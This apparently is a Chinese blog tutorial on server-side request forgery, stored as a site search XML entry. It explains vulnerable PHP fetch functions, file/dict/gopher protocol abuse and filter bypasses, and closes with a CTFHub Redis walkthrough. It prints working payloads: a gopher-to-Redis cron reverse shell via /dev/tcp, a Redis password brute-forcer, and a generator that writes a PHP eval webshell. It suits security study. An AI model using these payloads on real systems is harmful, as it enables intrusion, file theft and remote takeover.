<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/10/10/SSRF/"/>
    <url>/2023/10/10/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三、漏洞函数"><a href="#三、漏洞函数" class="headerlink" title="三、漏洞函数"></a>三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、readfile()</p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四、协议"><a href="#四、协议" class="headerlink" title="四、协议"></a>四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> ，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http-和https"><a href="#http-和https" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;</h3><p>探测内网主机存活</p><h2 id="五、绕过方式"><a href="#五、绕过方式" class="headerlink" title="五、绕过方式"></a>五、绕过方式</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127-0-0-1等本地ip"><a href="#绕过127-0-0-1等本地ip" class="headerlink" title="绕过127.0.0.1等本地ip"></a>绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换"><a href="#ip的进制转换" class="headerlink" title="ip的进制转换"></a>ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六、SSRF漏洞点挖掘"><a href="#六、SSRF漏洞点挖掘" class="headerlink" title="六、SSRF漏洞点挖掘"></a>六、SSRF漏洞点挖掘</h2><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七、漏洞利用复现"><a href="#七、漏洞利用复现" class="headerlink" title="七、漏洞利用复现"></a>七、漏洞利用复现</h2><h3 id="ssrf打redis"><a href="#ssrf打redis" class="headerlink" title="ssrf打redis"></a>ssrf打redis</h3><p>主要方法：</p><ol><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考<a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">https://www.cnblogs.com/wjrblogs/p/14456190.html</a></p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><p><img src="/img/SSRF_img/clip_image002.gif" alt="img"></p><p>dict协议探测到6379端口开放</p><p><img src="/img/SSRF_img/clip_image004.gif" alt="img"></p><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><p><img src="/img/SSRF_img/clip_image006.gif" alt="img"></p><p>写马，执行，成功</p><p><img src="/img/SSRF_img/clip_image008.gif" 